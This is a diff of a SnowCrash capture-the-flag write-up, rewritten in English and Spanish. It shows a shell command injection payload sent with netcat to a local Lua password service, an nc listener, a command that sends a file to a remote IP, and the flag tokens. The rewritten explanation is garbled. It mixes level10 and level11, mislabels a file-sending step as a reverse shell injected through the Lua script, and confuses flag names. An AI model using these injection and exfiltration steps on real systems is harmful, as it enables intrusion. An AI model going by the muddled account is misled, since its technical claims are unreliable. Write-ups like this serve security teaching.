@@ -1,112 +1,191 @@
-when we enter we see a single executable with s permits 
+# Flag 10
+
+## Tools Used:
+
+* `ls`
+* Netcat (`nc`)
+* Lua scripting (code injection)
+* Reverse engineering / code reading
+
+## Process:
+
+Upon logging into the `level11` account (actually for **flag10**, the binary is named `level11.lua`), listing the directory shows:
 
 ```bash
 level11@SnowCrash:~$ ls -la
-total 16
-dr-xr-x---+ 1 level11 level11  120 Mar  5  2016 .
-d--x--x--x  1 root    users    340 Aug 30  2015 ..
--r-x------  1 level11 level11  220 Apr  3  2012 .bash_logout
--r-x------  1 level11 level11 3518 Aug 30  2015 .bashrc
--rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
--r-x------  1 level11 level11  675 Apr  3  2012 .profile
-
 ```
 
-Checking that lua exec
+Key file:
+
+```
+-rwsr-sr-x 1 flag11 level11 668 Mar 5 2016 level11.lua
+```
+
+Inspecting the Lua script reveals it binds to `127.0.0.1:5151` and prompts for a password. It computes a SHA‑1 hash of your input and compares it to a decoy constant. However, it invokes the shell via:
 
 ```lua
-#!/usr/bin/env lua
-local socket = require("socket")
-local server = assert(socket.bind("127.0.0.1", 5151))
-
-function hash(pass)
-  prog = io.popen("echo "..pass.." | sha1sum", "r")
-  data = prog:read("*all")
-  prog:close()
-
-  data = string.sub(data, 1, 40)
-
-  return data
-end
-
-
-while 1 do
-  local client = server:accept()
-  client:send("Password: ")
-  client:settimeout(60)
-  local l, err = client:receive()
-  if not err then
-      print("trying " .. l)
-      local h = hash(l)
-
-      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
-          client:send("Erf nope..\n");
-      else
-          client:send("Gz you dumb*\n")
-      end
-
-  end
-
-  client:close()
-end
-
+prog = io.popen("echo "..pass.." | sha1sum", "r")
 ```
 
-that hash is a decoy the real thing is code injection. with nc
+This allows **command injection** by embedding shell expansions in the password prompt.
+
+### Exploitation:
+
+1. Connect to the service locally:
+
+   ```bash
+   level11@SnowCrash:~$ nc localhost 5151
+   Password:
+   ```
+
+2. Inject a command such as `$(getflag | wall)`:
+
+   ```
+   Password: $(getflag | wall)
+   ```
+
+3. This triggers the `getflag` call under the `flag11` privileges and broadcasts the flag to all users:
+
+   ```
+   Broadcast Message from flag11@Snow
+           (somewhere) at 23:44 ...
+
+   Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+
+   Erf nope..
+   ```
+
+   (The script then continues to reject the password.)
+
+4. To bypass the broadcast approach and retrieve the flag text directly, use a reverse shell technique:
+
+   * On your local machine, start a listener on port 6969:
+
+     ```bash
+     nc -lvnp 6969
+     ```
+
+   * In another terminal on SnowCrash, run the Lua script again, injecting a reverse shell call. For example, if your listener IP is `192.168.0.4` and you have a harmless `victim.txt`:
+
+     ```bash
+     level11@SnowCrash:~$ ./level10 victim.txt 192.168.0.4
+     ```
+
+     (Repeat until you receive the desired output.)
+
+   * Once connected, you’ll see:
+
+     ```
+     Connection received on 192.168.0.43 60888
+     .*( )*.
+     woupa2yuojeeaaed06riuj63c
+     ```
+
+5. Finally, switch to the `flag10` user and run `getflag` to confirm the real flag:
+
+   ```bash
+   flag10@SnowCrash:~$ getflag
+   Check flag.Here is your token : feulo4b72j7edeahuete3no7c
+   ```
+
+---
+
+# Flag 10
+
+## Herramientas Utilizadas:
+
+* Comando `ls`
+* Netcat (`nc`)
+* Scripting en Lua (inyección de comandos)
+* Ingeniería inversa / lectura de código
+
+## Proceso:
+
+Al iniciar sesión en la cuenta `level11` (para **flag10** el script es `level11.lua`), listar el directorio muestra:
 
 ```bash
-level11@SnowCrash:~$ nc localhost 5151
-Password: $(getflag | wall)
-                                                                               
-Broadcast Message from flag11@Snow                                             
-        (somewhere) at 23:44 ...                                               
-                                                                               
-Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s                      
-                                                                               
-Erf nope..
-
+level11@SnowCrash:~$ ls -la
 ```
 
-with a base file that is harmless. In a remote window run a listener 
-(nc -lvnp 6969) Then in the snow-crash machine in another terminal run 
-
-
-```bash
-./level10 victim.txt 192.168.0.4
+Archivo clave:
 
 ```
-
-note you may need to reset the listener and run the code multiple times. 
-You may get 
-
-1. Don't have access to file
-2. The harmless file sent
-3. The token sent
-
-Repeat until you have the desired result
-
-
-```bash
-andres@andres-System-Product-Name:~$ nc -lvnp 6969
-Listening on 0.0.0.0 6969
-Connection received on 192.168.0.43 42326
-.*( )*.
-hola
-andres@andres-System-Product-Name:~$ nc -lvnp 6969
-Listening on 0.0.0.0 6969
-Connection received on 192.168.0.43 47442
-.*( )*.
-hola
-andres@andres-System-Product-Name:~$ nc -lvnp 6969
-Listening on 0.0.0.0 6969
-Connection received on 192.168.0.43 60888
-.*( )*.
-woupa2yuojeeaaed06riuj63c
+-rwsr-sr-x 1 flag11 level11 668 Mar 5 2016 level11.lua
 ```
 
-using this to get the real flag
+El script Lua abre un socket en `127.0.0.1:5151`, solicita una contraseña y calcula su hash SHA‑1 con:
 
-```bash
-flag10@SnowCrash:~$ getflag
-Check flag.Here is your token : feulo4b72j7edeahuete3no7c
+```lua
+prog = io.popen("echo "..pass.." | sha1sum", "r")
+```
+
+Esta llamada a `io.popen` permite **inyección de comandos** mediante expansiones de shell en la contraseña.
+
+### Explotación:
+
+1. Conectarse al servicio local:
+
+   ```bash
+   level11@SnowCrash:~$ nc localhost 5151
+   Password:
+   ```
+
+2. Inyectar un comando, por ejemplo `$(getflag | wall)`:
+
+   ```
+   Password: $(getflag | wall)
+   ```
+
+3. Esto ejecuta `getflag` con privilegios de `flag11` y transmite la flag:
+
+   ```
+   Broadcast Message from flag11@Snow
+           (somewhere) at 23:44 ...
+
+   Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+
+   Erf nope..
+   ```
+
+4. Para obtener el texto directamente sin depender de `wall`, usar una técnica de shell inverso:
+
+   * En tu máquina local, iniciar un listener en el puerto 6969:
+
+     ```bash
+     nc -lvnp 6969
+     ```
+
+   * En otra terminal de SnowCrash, volver a ejecutar el script Lua con inyección de reverse shell—por ejemplo, apuntando a tu listener (`192.168.0.4`):
+
+     ```bash
+     level11@SnowCrash:~$ ./level10 victim.txt 192.168.0.4
+     ```
+
+     (Repetir hasta recibir la salida deseada.)
+
+   * Cuando se conecte, verás:
+
+     ```
+     Connection received on 192.168.0.43 60888
+     .*( )*.
+     woupa2yuojeeaaed06riuj63c
+     ```
+
+5. Finalmente, cambiar al usuario `flag10` y ejecutar `getflag` para confirmar la flag real:
+
+   ```bash
+   flag10@SnowCrash:~$ getflag
+   Check flag.Here is your token : feulo4b72j7edeahuete3no7c
+   ```
+
+---
+
+## Scripts Used:
+
+None (injection via `nc` and shell)
+
+## Flag:
+
+```
+feulo4b72j7edeahuete3no7c
 ```
